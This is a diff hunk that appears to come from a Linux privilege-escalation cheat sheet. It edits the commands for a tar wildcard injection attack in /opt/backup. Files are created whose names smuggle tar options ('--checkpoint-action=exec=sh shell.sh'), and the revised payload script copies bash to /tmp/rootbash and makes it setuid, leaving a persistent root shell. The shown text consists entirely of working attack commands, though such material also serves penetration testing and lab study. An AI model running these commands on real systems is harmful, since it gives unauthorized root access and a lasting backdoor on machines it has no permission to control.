@@ -161,7 +161,7 @@ Using a fine-grained set of privileges: Use of capability can be more clearly un
 ### TAR WILDCARDS
 
             cd /opt/backup
-            echo -e '#!/bin/bash\n/bin/bash' > shell.sh
+            echo -e '#!/bin/bash\ncp /bin/bash /tmp/rootbash\nchmod +s /tmp/rootbash' > shell.sh
             echo "" > "--checkpoint-action=exec=sh shell.sh"
             echo "" > --checkpoint=1
 
